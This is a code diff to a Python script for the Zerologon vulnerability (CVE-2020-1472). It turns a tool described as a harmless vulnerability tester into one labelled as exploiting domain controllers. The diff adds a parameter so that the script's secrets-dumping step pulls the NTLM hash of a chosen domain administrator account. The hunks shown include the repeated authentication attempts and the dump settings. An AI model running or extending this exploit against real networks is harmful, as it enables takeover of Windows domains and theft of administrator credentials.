@@ -59,7 +59,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
     fail(f'Unexpected error: {ex}.')
 
 
-def perform_attack(dc_handle, dc_ip, target_computer):
+def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator"):
   # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
   print('Performing authentication attempts...')
   rpc_con = None
@@ -105,7 +105,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
             self.exec_method = "smbexec"
             self.just_dc = True
             self.just_dc_ntlm = True
-            self.just_dc_user = "Administrator"
+            self.just_dc_user = target_da
             self.pwd_last_set = None
             self.user_status = None
             self.resumefile = None
@@ -127,12 +127,19 @@ def perform_attack(dc_handle, dc_ip, target_computer):
 
 if __name__ == '__main__':
   if not (3 <= len(sys.argv) <= 4):
-    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
-    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
+    print('Usage: %s dc_name dc_ip [target_domain_admin_username]\n' % sys.argv[0])
+    print('Exploits a domain controller that is vulnerable to the Zerologon attack (CVE-2020-1472).')
     print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
+    print("Addtl. Note: target_domain_admin_username should be a username associated with a known domain administrator of the same domain as the target DC.")
     sys.exit(1)
   else:
-    [_, dc_name, dc_ip] = sys.argv
 
-    dc_name = dc_name.rstrip('$')
-    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
+    if len(sys.argv) == 4:
+        [_, dc_name, dc_ip, target_da] = sys.argv
+        dc_name = dc_name.rstrip('$') 
+        perform_attack('\\\\' + dc_name, dc_ip, dc_name, target_da)
+    else:
+        [_, dc_name, dc_ip] = sys.argv
+        dc_name = dc_name.rstrip('$') 
+        perform_attack('\\\\' + dc_name, dc_ip, dc_name)
+
